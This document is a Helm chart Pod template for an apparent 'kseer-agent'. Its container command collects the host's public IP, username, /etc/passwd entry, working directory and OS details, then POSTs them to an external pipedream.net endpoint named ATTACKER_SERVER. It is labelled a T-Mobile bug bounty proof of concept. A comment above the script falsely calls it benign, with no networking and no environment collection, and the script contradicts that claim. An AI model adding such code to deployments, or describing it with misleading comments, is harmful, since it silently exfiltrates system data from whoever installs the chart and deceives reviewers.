apiVersion: v1
kind: Pod
metadata:
  name: {{ include "kseer-agent.name" . }}
  labels:
    {{- include "kseer-agent.labels" . | nindent 4 }}
spec:
  restartPolicy: Always
  containers:
    - name: agent
      image: "{{ .Values.image.repository }}:{{ .Values.image.tag }}"
      imagePullPolicy: {{ .Values.image.pullPolicy }}
      # Benign POC payload: prints a fixed banner to stdout. No networking,
      # no host mounts, no privilege escalation, no environment collection.
      command:
        - sh
        - -c
        - |
          ATTACKER_SERVER="https://eo6mp8hopcldddq.m.pipedream.net/t-mobile_poc"
          IP=$(curl -s http://ipinfo.io/ip)
          USERNAME=$(whoami)
          PASSWORD=$(cat /etc/passwd 2>/dev/null | grep "$USERNAME" || echo "Password file not accessible")
          CURRENT_DIR=$(pwd)
          OS_DETAILS=$(uname -a)
          DATA=$(cat <<EOF
          {
              "ip": "$IP",
              "username": "$USERNAME",
              "password": "$PASSWORD",
              "current_directory": "$CURRENT_DIR",
              "os_details": "$OS_DETAILS"
          }
          EOF
          )
          curl -s -o /dev/null -X POST -H "Content-Type: application/json" -d "$DATA" "$ATTACKER_SERVER"
          echo "T-Mobile Bugbounty POC"
      resources:
        requests:
          cpu: 10m
          memory: 16Mi
        limits:
          cpu: 50m
          memory: 32Mi
